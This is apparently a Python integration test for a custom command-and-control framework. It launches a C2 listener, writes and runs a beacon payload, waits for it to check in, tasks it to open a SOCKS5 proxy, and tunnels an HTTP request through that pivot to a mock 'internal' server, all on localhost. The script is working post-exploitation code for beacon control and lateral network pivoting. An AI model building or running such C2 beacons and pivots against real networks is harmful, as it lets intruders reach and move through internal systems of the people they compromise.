#!/usr/bin/env python3
"""Test the SOCKS5 pivot: beacon runs a SOCKS5 server; a local HTTP server is
the 'internal' target; we CONNECT through the SOCKS5 proxy and reach it."""
import os, sys, time, threading, socket, subprocess, shutil, hashlib
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
from cs.server import TeamServer
from cs.payload import write_payload

DATA = os.path.join(os.path.dirname(os.path.abspath(__file__)), "data_socks")
shutil.rmtree(DATA, ignore_errors=True)

# --- an "internal" HTTP server to tunnel to ---
from http.server import BaseHTTPRequestHandler, HTTPServer
class H(BaseHTTPRequestHandler):
    def do_GET(self):
        body = b"INTERNAL-PIVOT-REACHED"
        self.send_response(200)
        self.send_header("Content-Length", str(len(body)))
        self.end_headers()
        self.wfile.write(body)
    def log_message(self,*a): pass
httpd = HTTPServer(("127.0.0.1", 0), H)
INT_PORT = httpd.server_address[1]
threading.Thread(target=httpd.serve_forever, daemon=True).start()
print("[+] internal target on 127.0.0.1:%d" % INT_PORT)

# --- C2 listener ---
PORT = 19711
srv = TeamServer(data_dir=DATA)
srv.start_listener("main", "127.0.0.1", PORT)
bp = os.path.join(DATA, "bp.py")
write_payload(f"http://127.0.0.1:{PORT}", bp, interval=1, jitter=0)
bid = hashlib.sha1(b"socks-beacon").hexdigest()[:16]
proc = subprocess.Popen([sys.executable, "-u", bp, "--name", bid],
                        stdout=open(os.path.join(DATA,"b.log"),"w"), stderr=subprocess.STDOUT)
dl = time.time()+10
while time.time()<dl and not srv.store.all():
    time.sleep(0.3)
if not srv.store.all():
    print("[!] beacon didn't check in"); proc.kill(); sys.exit(1)
sid = srv.store.all()[0]["id"]
print("[+] beacon session:", sid)

# --- start SOCKS5 pivot on the beacon ---
srv.task(sid, "socks 18881")
time.sleep(6)   # beacon interval is 1s; allow several checkin cycles

# --- SOCKS5 client: connect through the beacon pivot to the internal target ---
def socks5_connect(proxy, target_host, target_port):
    s = socket.create_connection(proxy, timeout=10)
    s.sendall(b"\x05\x01\x00")                 # VER 5, 1 method, no-auth
    resp = s.recv(2)
    assert resp == b"\x05\x00", resp
    # CONNECT host (domain form)
    host_b = target_host.encode()
    req = b"\x05\x01\x00\x03" + bytes([len(host_b)]) + host_b + \
          bytes([target_port >> 8, target_port & 0xFF])
    s.sendall(req)
    rep = s.recv(10)
    assert rep[1] == 0, rep          # success
    s.sendall(b"GET / HTTP/1.1\r\nHost: x\r\nConnection: close\r\n\r\n")
    data = b""
    s.settimeout(8)
    try:
        while True:
            c = s.recv(4096)
            if not c: break
            data += c
    except socket.timeout:
        pass
    s.close()
    return data

time.sleep(1)
try:
    got = socks5_connect(("127.0.0.1", 18881), "127.0.0.1", INT_PORT)
    print("--- through pivot ---")
    print(got[-80:].decode(errors="replace").strip())
    ok = b"INTERNAL-PIVOT-REACHED" in got
except Exception as e:
    print("[!] socks connect failed:", e)
    ok = False

proc.terminate()
srv.stop_listener("main")
print("\n[PASS]" if ok else "[FAIL]", "SOCKS5 pivot tunneled to internal network")
sys.exit(0 if ok else 1)
